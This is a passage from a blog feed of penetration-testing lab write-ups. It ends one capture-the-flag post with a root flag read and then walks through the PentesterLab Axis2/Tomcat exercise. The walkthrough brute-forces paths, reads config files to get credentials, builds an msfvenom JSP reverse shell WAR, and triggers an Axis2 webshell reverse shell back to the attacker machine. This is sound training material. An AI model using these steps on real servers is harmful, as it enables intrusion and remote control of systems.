</span><span class='line'>-rw<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>-.  <span class="m">1</span> root root   <span class="m">133</span> Jan <span class="m">18</span>  <span class="m">2015</span> .lesshst
</span><span class='line'>drwx<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>.  <span class="m">2</span> root root     <span class="m">6</span> Jun <span class="m">19</span> 08:39 .ssh
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span>.  <span class="m">1</span> root root   <span class="m">129</span> Dec <span class="m">29</span>  <span class="m">2013</span> .tcshrc
</span><span class='line'>-r<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>.  <span class="m">1</span> root root <span class="m">14892</span> Jul <span class="m">14</span> 14:25 flag.txt
</span><span class='line'>bash-4.2# cat /root/flag.txt
</span><span class='line'>cat /root/flag.txt
</span><span class='line'>Well <span class="k">done</span>!&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Here<span class="p">&amp;</span>rsquo<span class="p">;</span>s your flag: 3eb030c6ab099b0a355712fe38d59ffb&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Ascii Art: Mark Van Hooren
</span><span class='line'><span class="o">(</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.retrojunkie.com/asciiart/cartchar/snowwhit.htm&quot;</span>&gt;http://www.retrojunkie.com/asciiart/cartchar/snowwhit.htm&lt;/a&gt;<span class="o">)</span>
</span><span class='line'>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-
</span><span class='line'><span class="p">&amp;</span>hellip<span class="p">;</span> turncate <span class="p">&amp;</span>hellip<span class="p">;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Thanks Sagi- and cheers g0blin!</p>

<!--- Reference -->



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[PentesterLab] Axis2 Web service and Tomcat Manager]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/05/30/pentesterlab-axis2-web-service-and-tomcat-manager/"/>
    <updated>2015-05-30T08:16:43-04:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/05/30/pentesterlab-axis2-web-service-and-tomcat-manager</id>
    <content type="html"><![CDATA[<p>&ldquo;This course details the exploitation of an issue in an Axis2 Web service and how using this issue it is possible to retrieve arbitrary files. Then using this, we will see how an attacker can retrieve Tomcat users' file to access the Tomcat Manager and gain commands execution on the server.&rdquo; &ndash; <font color="green"><em>PentesterLab</em></font></p>

<p>More information and ISO download please check <a href="https://www.pentesterlab.com/exercises/axis2_and_tomcat_manager/">here</a>. The official <a href="https://www.pentesterlab.com/exercises/axis2_and_tomcat_manager/course">course</a> is highly recommanded to read.</p>

<p>Difficulty: 3 / 5</p>

<!-- more -->


<h2>Walkthrough</h2>

<p>Based on the result of NMAP scan, tcp port 80 is open.</p>

<p>Access tcp port 80 and use DirBuster/wfuzz to brute force hidden path and found &ldquo;/axis2&rdquo;:</p>

<p>wfuzz command to burte force hidden path:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt &ndash;hc 404 &lt;a href="http://10.10.10.129/FUZZ">http://10.10.10.129/FUZZ&lt;/a> 2>/dev/null</span></code></pre></td></tr></table></div></figure></p>

<p><img src="/downloads/Axis2_Web_Tomcat/1.png"></p>

<p>Due to axis2&rsquo;s ProxyService has information retrieving vulnerability, exploit it and find users' passwords information.</p>

<p>Here are two methods to upload webshell.</p>

<h3>Method 1</h3>

<p>Retrieving Tomcat manager configuration to get login credentials.</p>

<p>In Debian Linux, the tomcat configuration file <code>tomcat-users.xml</code> has default location: <font color="red"><em>/etc/tomcat6/tomcat-users.xml</em></font></p>

<p><img src="/downloads/Axis2_Web_Tomcat/2.png"></p>

<p>From <code>tomcat-users.xml</code> file, the tomcat manager-gui login password can be found: <font color="red"><em>manager / !mp0ss!bl32gu355</em></font></p>

<p>Then login tomcat manager from the URL <code>http://10.10.10.129/manager/html</code> to upload and deploy JSP webshell in WAR file.</p>

<p>Use msfvenom to generate JSP reverse shell and build the war file using <code>jar</code>:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ mkdir webshell
</span><span class='line'>$ cd webshell
</span><span class='line'>$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.131 LPORT=4444 -f raw > sh4.jsp
</span><span class='line'>$ jar -cvf ../webshell.jar *</span></code></pre></td></tr></table></div></figure></p>

<p>Use the following URL to trigger reverse shell connect back to my Kali on port 4444:</p>

<p><code>http://10.10.10.129/webshell/sh4.jsp</code></p>

<p><img src="/downloads/Axis2_Web_Tomcat/3.png"></p>

<h3>Method 2</h3>

<p>Retrieving Axis2 configuration to get login credentials.</p>

<p>In Debian Linux, the axis2 configuration file <code>axis2.xml</code> has default location: <font color="red"><em>/var/lib/tomcat6/webapps/axis2/WEB-INF/conf/axis2.xml</em></font></p>

<p><img src="/downloads/Axis2_Web_Tomcat/4.png"></p>

<p>From <code>axis2.xml</code> file, the axis2 admin login password can be found: <font color="red">admin / axis2</font></p>

<p>Then login axis2 admin page from the URL <code>http://10.10.10.129/axis2/axis2-admin/</code> to upload and deploy axis2 webshell in AAR file.</p>

<p>Here I use <code>Cat.aar</code> <a href="https://github.com/tennc/webshell/tree/master/other/cat.aar">axis2 webshell</a>, upload and deploy it as axis2 service.</p>

<p><img src="/downloads/Axis2_Web_Tomcat/5.png"></p>

<p>Then use the following URL to trigger reverse shell connect back to my Kali on port 5555:</p>

<p><code>http://10.10.10.129/axis2/services/Cat/shell?host=10.10.10.131&amp;port=5555</code></p>

<p><img src="/downloads/Axis2_Web_Tomcat/6.png"></p>
]]></content>
  </entry>
  
</feed>
